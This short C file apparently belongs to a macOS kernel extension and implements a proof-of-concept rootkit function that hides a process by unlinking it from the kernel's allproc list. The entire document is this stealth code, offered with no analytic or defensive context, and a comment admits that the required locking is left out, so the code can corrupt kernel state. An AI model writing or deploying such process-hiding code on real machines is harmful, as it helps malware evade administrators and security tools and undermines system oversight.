
#include <mach/mach_types.h>
#include <libkern/libkern.h>
#include <sys/proc.h>

extern struct proc *allproc;

void hide_process_by_pid(pid_t target_pid) {
    struct proc *p = NULL;
    struct proc *prev = NULL;

    // Locking is required in real kernel code; omitted here for PoC
    for (p = allproc; p != NULL; p = p->p_list.le_next) {
        if (p->p_pid == target_pid) {
            if (prev) {
                prev->p_list.le_next = p->p_list.le_next;
            } else {
                allproc = p->p_list.le_next;
            }
            printf("Unlinked process with PID %d\n", target_pid);
            break;
        }
        prev = p;
    }
}
